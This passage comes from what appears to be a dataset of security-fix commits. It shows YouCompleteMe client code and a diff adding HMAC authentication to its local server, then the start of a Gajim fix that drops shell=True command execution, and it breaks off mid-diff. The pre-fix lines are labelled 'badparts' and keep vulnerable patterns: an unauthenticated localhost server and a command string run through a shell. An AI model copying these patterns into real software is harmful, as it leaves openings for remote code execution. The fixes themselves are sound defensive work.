'application\/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests\/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http:\/\/localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"},"\/python\/ycm\/youcompleteme.py":{"changes":[{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]},{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]}],"source":"\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http:\/\/localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server\/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https:\/\/github.com\/Valloric\/YouCompleteMe\/issues\/641\n#  https:\/\/github.com\/kennethreitz\/requests\/issues\/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server\/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}},"msg":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}},"https:\/\/github.com\/lheckemann\/gajim":{"9586c571f094e00023ff1e5a404a3931b4a90b8a":{"url":"https:\/\/api.github.com\/repos\/lheckemann\/gajim\/commits\/9586c571f094e00023ff1e5a404a3931b4a90b8a","html_url":"https:\/\/github.com\/lheckemann\/gajim\/commit\/9586c571f094e00023ff1e5a404a3931b4a90b8a","message":"execute commands without use_shell=True to prevent remote code execution, except for commands configured in triggers plugin (configured by user itself). Fixes #7031","sha":"9586c571f094e00023ff1e5a404a3931b4a90b8a","keyword":"remote code execution prevent","diff":"diff --git a\/src\/common\/helpers.py b\/src\/common\/helpers.py\nindex 722fbebe2..97996f01b 100644\n--- a\/src\/common\/helpers.py\n+++ b\/src\/common\/helpers.py\n@@ -40,6 +40,7 @@\n import select\n import base64\n import hashlib\n+import shlex\n import caps_cache\n \n from encodings.punycode import punycode_encode\n@@ -381,8 +382,18 @@ def is_in_path(command, return_abs_path=False):\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)\ndiff --git a\/src\/notify.py b\/src\/notify.py\nindex a8a737863..1f6eada51 100644\n--- a\/src\/notify.py\n+++ b\/src\/notify.py\n@@ -167,7 +167,7 @@ def _nec_notification(self, obj):\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, 